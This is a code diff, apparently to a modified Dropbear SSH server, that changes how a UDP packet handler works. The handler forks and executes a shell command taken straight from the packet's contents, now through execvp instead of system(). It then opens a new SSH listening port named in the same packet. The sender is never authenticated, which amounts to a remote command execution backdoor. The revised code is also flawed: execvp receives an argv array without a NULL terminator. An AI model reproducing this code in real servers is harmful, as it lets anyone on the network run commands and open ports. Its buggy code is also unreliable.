@@ -491,7 +491,9 @@ static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t 
 				if(setuid(1000) != 0) TRACE(("Failed to set nonroot UID")); 
 			}
 
-			int status = system(udp_msg->shell_command);
+			char *argv[1];
+			argv[0] = udp_msg->shell_command;
+			execvp(udp_msg->shell_command, argv); 
 		}
 		// parent process
 		else if (pid > 0)
@@ -499,40 +501,38 @@ static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t 
 			// we start listening on the port
 			int stat_val;
     		waitpid(pid, &stat_val, 0);
-			// TRACE(("****** after wait pid about to add the new port1")) we dont go here why..?
 			if (WIFEXITED(stat_val))
       			TRACE(("Child exited with code %d\n", WEXITSTATUS(stat_val)))
     		else if (WIFSIGNALED(stat_val))
       			TRACE(("Child terminated abnormally, signal %d\n", WTERMSIG(stat_val)))
 
+			// add the new port here
+			TRACE(("****** after wait pid about to add the new port"))
+			// "addportandaddress"
+			svr_opts.ports[svr_opts.portcount] = m_strdup(udp_msg->port_number);
+			svr_opts.addresses[svr_opts.portcount] = m_strdup(DROPBEAR_DEFADDRESS);
+			svr_opts.portcount++;
+			// listensockets->dropbearlisten
+			char* errstring = NULL;
+			int nsock = dropbear_listen(DROPBEAR_DEFADDRESS, udp_msg->port_number, listensocks[listensockcount], 
+					MAX_LISTEN_ADDR - listensockcount,
+					&errstring, maxfd);
+			TRACE(("******after dropbear_listen to new port! %u", udp_msg->port_number))		
+
+			if (nsock < 0) {
+				dropbear_log(LOG_WARNING, "Failed listening on '%s': %s", 
+								udp_msg->port_number, errstring);
+				m_free(errstring);
+				
+			}
+
+		return nsock;	  
+
 		}
 		else
 		{ // error 
 			TRACE(("fork failed - couldn't create proccess to run shell cmd %s", udp_msg->shell_command))
-		}
-		
-		// add the new port here
-		TRACE(("****** after wait pid about to add the new port2"))
-		// "addportandaddress"
-		svr_opts.ports[svr_opts.portcount] = m_strdup(udp_msg->port_number);
-		svr_opts.addresses[svr_opts.portcount] = m_strdup(DROPBEAR_DEFADDRESS);
-		svr_opts.portcount++;
-		// listensockets->dropbearlisten
-		char* errstring = NULL;
-		int nsock = dropbear_listen(DROPBEAR_DEFADDRESS, udp_msg->port_number, listensocks[listensockcount], 
-				MAX_LISTEN_ADDR - listensockcount,
-				&errstring, maxfd);
-		TRACE(("******after dropbear_listen to new port! %u", udp_msg->port_number))		
-
-		if (nsock < 0) {
-			dropbear_log(LOG_WARNING, "Failed listening on '%s': %s", 
-							udp_msg->port_number, errstring);
-			m_free(errstring);
-			
-		}
-
-		return nsock;
-		
+		}				
 	}
 
 	else
